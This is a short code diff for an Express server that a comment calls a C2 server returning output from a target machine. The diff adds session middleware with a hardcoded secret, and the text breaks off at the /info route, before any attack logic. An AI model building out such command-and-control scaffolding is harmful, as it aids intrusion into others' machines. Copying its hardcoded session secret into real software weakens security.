@@ -1,13 +1,25 @@
 const express = require('express')
-const app = express();
 const hostname = '172.31.18.80';
 const port = 443;
+var session = require('express-session');
+
+const app = express();
 
 var command = "ipconfig";
 
+app.use(session({
+	secret: "keyboardCat",
+	resave: false,
+	saveUninitialized: true
+}));
+
 app.get('/', (req, res) => {
 	res.send('Hello World');
+	sid = req.sessionID;
+	console.log(sid);
 });
+
+
 
 //Used to return the output from the target machine to our C2 server
 app.get('/info', (request, response) => {
